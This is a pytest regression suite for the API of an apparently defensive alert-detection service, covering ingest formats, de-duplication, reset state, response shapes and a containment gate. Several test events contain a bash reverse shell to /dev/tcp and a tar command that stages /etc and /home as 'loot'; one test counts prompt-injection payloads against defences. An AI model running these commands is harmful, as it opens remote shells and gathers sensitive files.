"""API contract and regression tests.

The existing suite covers detection logic. These cover the *edges* where the last
two production bugs actually lived:

  * the demo endpoint silently returning zero alerts because of de-duplication
  * reset not clearing in-memory detection state
  * response shapes drifting while the UI depends on them

Every assertion here corresponds to something the UI or an operator relies on.
"""
from __future__ import annotations

from conftest import event


# --------------------------------------------------------------------------- #
# Ingest input forms
# --------------------------------------------------------------------------- #
def test_ingest_accepts_single_object(client):
    r = client.post("/ingest", json=event(process="useradd", cmdline="useradd x"))
    assert r.status_code == 200
    assert r.json()["received"] == 1


def test_ingest_accepts_bare_array(client):
    body = [event(process="useradd", cmdline="useradd a"),
            event(process="useradd", cmdline="useradd b")]
    r = client.post("/ingest", json=body)
    assert r.json()["received"] == 2


def test_ingest_accepts_events_envelope(client):
    r = client.post("/ingest", json={"events": [event(process="useradd", cmdline="useradd c")]})
    assert r.json()["received"] == 1


def test_ingest_rejects_unparseable_timestamp(client):
    bad = event(process="useradd", cmdline="useradd x")
    bad["ts"] = "not-a-date"
    r = client.post("/ingest", json=bad)
    assert r.status_code == 422
    assert "invalid event" in r.json()["detail"].lower()


def test_ingest_joins_list_cmdline(client):
    r = client.post("/ingest", json=event(
        process="bash", src_ip="203.0.113.9",
        cmdline=["bash", "-i", ">&", "/dev/tcp/203.0.113.9/4444"])).json()
    a = client.get(f"/api/alerts/{r['alert_ids'][0]}").json()
    assert " ".join(a["event"]["cmdline"].split()) == "bash -i >& /dev/tcp/203.0.113.9/4444"


def test_ingest_parses_epoch_timestamp(client):
    ev = event(process="useradd", cmdline="useradd x")
    ev["ts"] = 1_760_000_000
    r = client.post("/ingest", json=ev).json()
    assert client.get(f"/api/alerts/{r['alert_ids'][0]}").status_code == 200
    a = client.get(f"/api/alerts/{r['alert_ids'][0]}").json()
    assert a["ts"].startswith("2025-10-09")


# --------------------------------------------------------------------------- #
# De-duplication — the bug that made the demo button look broken
# --------------------------------------------------------------------------- #
def test_repeat_simulation_is_largely_suppressed_and_says_so(client):
    """The bug that made the demo button look broken: a second run produced
    almost nothing and reported success anyway. Two things must hold now —
    suppression is reported, and the repeat run adds far fewer alerts.

    Note it is not zero: brute-force counting state persists between runs, so a
    continued attack legitimately trips R001 once more for a fresh username.
    """
    first = client.post("/api/simulate/attack").json()
    second = client.post("/api/simulate/attack").json()

    assert first["alerts"] >= 10, "first run must produce the full chain"
    assert second["suppressed"] >= 8, "suppression must be reported, not silent"
    assert second["alerts"] < first["alerts"], "repeat run must add few alerts"
    assert second["sent"] == first["sent"]


def test_reset_then_simulate_reproduces_the_full_chain(client):
    """What the console actually does on click: clear, then run. This is the
    guarantee the demo depends on, so it gets its own test."""
    client.post("/api/simulate/attack")
    client.post("/api/reset")
    again = client.post("/api/simulate/attack").json()
    assert again["alerts"] >= 10
    assert client.get("/api/stats").json()["total"] >= 10


def test_reset_clears_detection_state_not_just_rows(client):
    """Brute-force counting lives in memory. If reset only emptied the DB, the
    counter would survive and a single failure would still trip R001."""
    for i in range(5):
        client.post("/ingest", json=event(
            event_type="auth", user=f"u{i}", status="failure",
            src_ip="198.51.100.5", message="Failed password"))
    assert client.get("/api/stats").json()["total"] >= 1

    client.post("/api/reset")
    lone = client.post("/ingest", json=event(
        event_type="auth", user="u9", status="failure",
        src_ip="198.51.100.5", message="Failed password")).json()
    assert lone["alerts"] == 0, "state survived reset; counter must be per-incident"


# --------------------------------------------------------------------------- #
# Response shapes the console depends on
# --------------------------------------------------------------------------- #
def test_alert_payload_has_fields_the_ui_renders(client):
    r = client.post("/ingest", json=event(
        process="bash", cmdline="bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
        src_ip="203.0.113.9")).json()
    a = client.get(f"/api/alerts/{r['alert_ids'][0]}").json()

    for key in ("id", "ts", "rule_id", "title", "severity", "technique",
                "why", "score", "sources", "event", "status"):
        assert key in a, f"UI reads '{key}' from the alert payload"
    assert a["why"], "the 'Why flagged' row must have text"
    assert a["event"]["host"] == "web-01"


def test_stats_shape(client):
    s = client.get("/api/stats").json()
    for key in ("total", "by_severity", "by_status", "by_rule", "rules",
                "techniques", "store"):
        assert key in s, f"console reads '{key}' from /api/stats"
    assert s["rules"] == 13


def test_health_shape(client):
    h = client.get("/api/health").json()
    for key in ("status", "llm_mode", "store", "rules", "baseline_processes"):
        assert key in h
    assert h["status"] == "ok"


def test_version_shape(client):
    v = client.get("/api/version").json()
    assert set(v) == {"sha", "built", "image"}


def test_unknown_alert_returns_404(client):
    assert client.get("/api/alerts/does-not-exist").status_code == 404
    assert client.post("/api/alerts/does-not-exist/block").status_code == 404


# --------------------------------------------------------------------------- #
# Containment gate edge cases
# --------------------------------------------------------------------------- #
def test_block_refuses_when_no_source_ip(client):
    """T1560 archive staging has no source IP, so containment has nothing to
    block. The gate must refuse rather than inventing a target."""
    r = client.post("/ingest", json=event(
        process="tar", cmdline="tar -czf /tmp/loot.tgz /etc /home")).json()
    d = client.post(f"/api/alerts/{r['alert_ids'][0]}/block").json()
    assert d["allowed"] is False
    assert d["checks"]["source_ip_present"] is False
    assert d["action"] is None


def test_simulation_contracts(client):
    a = client.post("/api/simulate/attack").json()
    assert {"sent", "alerts", "suppressed", "payloads"} <= set(a)

    i = client.post("/api/simulate/injection").json()
    assert {"payloads", "without_defenses", "with_defenses", "mode"} <= set(i)
    assert i["without_defenses"]["total"] == 12
    assert i["without_defenses"]["asr"] >= i["with_defenses"]["asr"], (
        "defences must not make injection worse")
